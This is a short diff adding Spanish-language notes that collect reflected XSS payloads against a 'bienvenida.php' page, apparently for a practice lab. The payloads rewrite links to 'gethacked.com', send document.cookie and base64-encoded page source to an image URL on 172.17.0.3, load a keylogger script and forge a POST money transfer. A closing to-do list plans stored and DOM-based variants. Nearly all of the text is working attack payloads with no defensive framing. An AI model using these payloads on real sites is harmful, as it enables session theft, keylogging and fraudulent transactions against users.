@@ -1,0 +1,24 @@
+
+REESCRIBIR CONTENIDO
+bienvenida.php?name=Victor<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://gethacked.com";}</script>
+
+ENVIAR COOKIE
+En url-encoded
+Victor<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="http://gethacked.com";};document.write('<img src="http://172.17.0.3:88/imagencuqui.png?' + document.cookie + '"/>')</script>
+<script>document.write('<img src="http://172.17.0.3:88/imagencuqui.png?' + document.cookie + '"/>')</script>
+
+KEYLOGGER
+Victor<script src="localhost/reflejado/keylogger.js"></script>
+
+ENVIAR REQUESTS POST
+En url-encoded
+<script>var xhr = new XMLHttpRequest();	xhr.open('POST','http://172.17.0.3/',true); xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded'); xhr.send('sendmoney=true&senderId=12321&receiverId=32832131&amount=99999');</script>
+
+SACAR SOURCE CODE
+<script>document.addEventListener('DOMContentLoaded', function() {document.write('<img src="http://172.17.0.3:88/imagencuqui.png?' + btoa(document.getElementsByTagName('html')[0].innerHTML) + '"/>')},false);</script>
+
+
+
+FALTAN:
+STORED (por SQL normal y con fullwidth)
+DOM (si no consigo que funcione, utilizar JQUERY según Ricardo)
